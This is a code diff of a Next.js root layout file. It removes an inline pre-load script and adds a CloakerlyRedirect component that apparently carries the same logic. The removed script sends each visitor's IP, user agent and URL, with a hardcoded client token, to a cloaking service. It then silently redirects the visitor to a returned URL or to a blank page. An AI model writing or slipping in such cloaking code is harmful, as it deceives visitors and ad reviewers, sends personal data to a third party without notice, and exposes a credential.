@@ -3,6 +3,7 @@ import { Libre_Baskerville, Source_Sans_3 } from 'next/font/google';
 import Script from 'next/script';
 import './globals.css';
 import CookieConsent from '@/components/CookieConsent';
+import CloakerlyRedirect from '@/components/CloakerlyRedirect';
 
 const displayFont = Libre_Baskerville({
   subsets: ['latin'],
@@ -60,12 +61,8 @@ export default function RootLayout({
 }) {
   return (
     <html lang="en-AU" className={`${displayFont.variable} ${bodyFont.variable}`}>
-      <head>
-        <Script id="cloakerly" strategy="beforeInteractive">
-          {`(async function(){try{var ip='';try{var r=await fetch('https://api.ipify.org?format=json');var j=await r.json();ip=j.ip||'';}catch(e){}var m=document.querySelector('meta[name="referrer"]');if(!m){m=document.createElement('meta');m.name='referrer';document.head.appendChild(m);}m.content='origin';var p=new URLSearchParams({campaign_id:'140',client_token:'856176411:ioma0qc1R3ZUKIwiyMjaTbpwB1Of7PhtMhBJDHqxruyPFQTGFDxSY7e0KL9dtVEz',ip:ip,user_agent:navigator.userAgent,current_url:window.location.href});var res=await fetch('https://api.cloakerly.com/v6/?'+p.toString());var d=await res.text();if(d.startsWith('http')){window.location.href=d;}else if(d!=='true'){window.location.href='about:blank';}}catch(e){}})();`}
-        </Script>
-      </head>
       <body>
+        <CloakerlyRedirect />
         {children}
         <CookieConsent />
 
